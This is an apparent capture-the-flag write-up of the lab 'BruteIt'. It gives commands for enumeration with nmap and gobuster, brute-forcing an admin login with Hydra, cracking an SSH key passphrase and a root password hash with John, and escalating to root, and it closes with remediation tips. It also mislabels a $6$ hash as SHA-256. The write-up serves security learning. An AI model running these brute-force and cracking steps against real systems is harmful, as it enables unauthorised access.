---
title: "BruteIt CTF CHALLENGE"
date: 2025-09-14 11:22:00 +0300
description: BruteIt CTF Challenge
image: /assets/images/BruteIt/Cover.png
categories: [WEB, Cryptography, Easy]
tags: [WEB, Cryptography, Easy, KenyaCyberlympics]
---

# BruteIt — CTF Write-Up

## Summary
This write-up documents the methodology and findings for the *BruteIt* challenge. 
Goals were recon (service enumeration), web enumeration, credential discovery by brute force, extraction and cracking of a protected private key, SSH access as a low-privilege user, and privilege escalation to root.

---

## Scope & environment
- Target: lab machine (TryHackMe / attack-box network)  
- Tools used (examples): `nmap`, `gobuster`, `hydra`, `john` (and `ssh2john`), `ssh`  
- Wordlists used: `rockyou.txt`, `/usr/share/wordlists/dirb/common.txt`

---

## Methodology
1. Service enumeration with `nmap -A -sV`.  
2. Web directory enumeration with `gobuster`.  
3. Inspect web source for hints and hidden resources.  
4. Brute force web login (Hydra) once username hint discovered.  
5. Download exposed RSA private key from admin panel.  
6. Convert private key for John, crack passphrase, use key to SSH.  
7. Local enumeration for privilege escalation, discover root hash, crack with John, escalate to root.

---

## Reconnaissance — results

### Port & service enumeration
**Command**

```bash
nmap -A -sV MACHINE_IP
````

**Findings**

* Open ports: `22/tcp` (SSH), `80/tcp` (HTTP)
* SSH banner: `OpenSSH 7.6p1`
* Apache: `Apache/2.4.29`
* OS: Ubuntu (Linux 4.x / kernel 4.15 in detection output)

<figure>
  <img src="/assets/images/BruteIt/ports-open.png" alt="Nmap output: ports open" style="max-width:100%;">
  <figcaption>Figure 1 — nmap output showing open ports and basic service info.</figcaption>
</figure>

<figure>
  <img src="/assets/images/BruteIt/ssh-version.png" alt="SSH banner OpenSSH 7.6p1" style="max-width:48%; display:inline-block;">
  <img src="/assets/images/BruteIt/apache-version.png" alt="Apache 2.4.29" style="max-width:48%; display:inline-block; float:right;">
  <figcaption>Figure 2 — Service banners: (left) SSH banner, (right) Apache banner.</figcaption>
</figure>

<figure>
  <img src="/assets/images/BruteIt/linux-distro.png" alt="OS detection Ubuntu" style="max-width:60%;">
  <figcaption>Figure 3 — OS detection indicating Ubuntu.</figcaption>
</figure>

---

## Web enumeration — hidden directories & admin panel


```bash
gobuster dir -u http://10.10.187.25 -w /usr/share/wordlists/dirb/common.txt
```


* Gobuster revealed hidden directories including an admin area.
* Inspecting page source revealed a username hint (comment).

<figure>
  <img src="/assets/images/BruteIt/hidden-directories.png" alt="Gobuster results" style="max-width:33%; display:inline-block;">
  <img src="/assets/images/BruteIt/admin-page.png" alt="Admin page screenshot" style="max-width:33%; display:inline-block;">
  <img src="/assets/images/BruteIt/source-page.png" alt="Page source with comment hint" style="max-width:33%; display:inline-block;">
  <figcaption>Figure 4 — Web enumeration screenshots: gobuster results, admin page, and source with hint.</figcaption>
</figure>

---

## Credentials discovered 

**Question:** What is the `user:password` for the admin panel?
**Answer:** `admin:xavier`

**How:** page source revealed `admin` as username; Hydra was used to brute-force the password.


```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP \
  http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```

<figure>
  <img src="/assets/images/BruteIt/hydra-results-1.png" alt="Hydra output 1" style="max-width:48%; display:inline-block;">
  <img src="/assets/images/BruteIt/hydra-results-2.png" alt="Hydra output 2" style="max-width:48%; display:inline-block;">
  <figcaption>Figure 5 — Hydra output confirming credentials; admin panel login screenshot included.</figcaption>
</figure>

---

## Private key extraction & cracking

### Download and protect the key

Save the RSA private key from the admin panel into `id_rsa` and set permissions:

```bash
nano id_rsa   # paste key contents
chmod 600 id_rsa
```

<figure>
  <img src="/assets/images/BruteIt/rsa-private-key.png" alt="RSA private key exposed" style="max-width:60%;">
  <figcaption>Figure 6 — RSA private key link exposed in admin panel; copy and save locally as <code>id_rsa</code>.</figcaption>
</figure>

### Convert key for John the Ripper

John requires the key in a specific hash format. Use `ssh2john` or the provided Python script:

```bash
# Preferred (if installed)
ssh2john id_rsa > id_rsa.hash

# If not available
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
python3 ssh2john.py id_rsa > id_rsa.hash
```

Crack with John using a wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash
```

<figure>
  <img src="/assets/images/BruteIt/changing-rsaPkey-hash.png" alt="ssh2john conversion" style="max-width:48%; display:inline-block;">
  <img src="/assets/images/BruteIt/paraphrase.png" alt="passphrase cracked" style="max-width:48%; display:inline-block;">
  <figcaption>Figure 7 — Conversion to John format and cracked passphrase output.</figcaption>
</figure>

---

## SSH access 


```bash
ssh -i id_rsa user@MACHINE_IP
```

**Result:** successful login to low-privilege account and capture of `user.txt`.

<figure>
  <img src="/assets/images/BruteIt/ssh-login.png" alt="SSH login" style="max-width:48%; display:inline-block;">
  <img src="/assets/images/BruteIt/user.txt-content.png" alt="user.txt content" style="max-width:48%; display:inline-block;">
  <figcaption>Figure 8 — SSH session and user flag capture.</figcaption>
</figure>

---

## Privilege escalation

### Local enumeration

Run the standard checks:

```bash
id
groups
sudo -l
```

Inspect files and permissions for sensitive information (config files, backups, credentials, scripts).

<figure>
  <img src="/assets/images/BruteIt/groups.png" alt="User groups" style="max-width:60%;">
  <figcaption>Figure 9 — User group membership and local enumeration clues.</figcaption>
</figure>

### Root hash found & cracked

A root password hash (SHA-256 / `$6$`) was discovered. Save and crack:

```bash
echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

<figure>
  <img src="/assets/images/BruteIt/root-password.png" alt="root hash found" style="max-width:48%; display:inline-block;">
  <img src="/assets/images/BruteIt/root-pass.png" alt="root password cracked" style="max-width:48%; display:inline-block;">
  <figcaption>Figure 10 — Saved root hash and cracked password output.</figcaption>
</figure>

### Final step — become root

Switch to root and retrieve the final flag:

```bash
su - root
cat /root/root.txt
```

<figure>
  <img src="/assets/images/BruteIt/flag.png" alt="root flag" style="max-width:60%;">
  <figcaption>Figure 11 — Final root flag.</figcaption>
</figure>

---

## Artifacts & commands 

```bash
# Recon
nmap -A -sV MACHINE_IP
gobuster dir -u http://10.10.187.25 -w /usr/share/wordlists/dirb/common.txt

# Brute-force web login
hydra -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP \
  http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V

# Save private key and secure it
nano id_rsa
chmod 600 id_rsa

# Convert private key to John format & crack
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
ssh -i id_rsa user@MACHINE_IP

# Crack root hash
echo 'root:$6$zdk0.jUm$...' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
su - root
cat /root/root.txt
```

---

## Recommendations & remediation

* Do not expose private keys or credentials via web interfaces. Remove any sensitive files from web roots.
* Harden web application input validation and remove debug hints/comments from production pages.
* Enforce strong passphrase complexity and consider account lockouts / rate limiting to mitigate brute-force attacks.
* Limit access to sensitive files and audit file permissions regularly.

---

## Conclusion

This write-up captures the complete attack chain: enumeration → web discovery → credential harvesting/brute force → private key extraction and cracking → SSH access → privilege escalation to root. The notes and commands above are formatted for reuse in a static site or report.

```
```
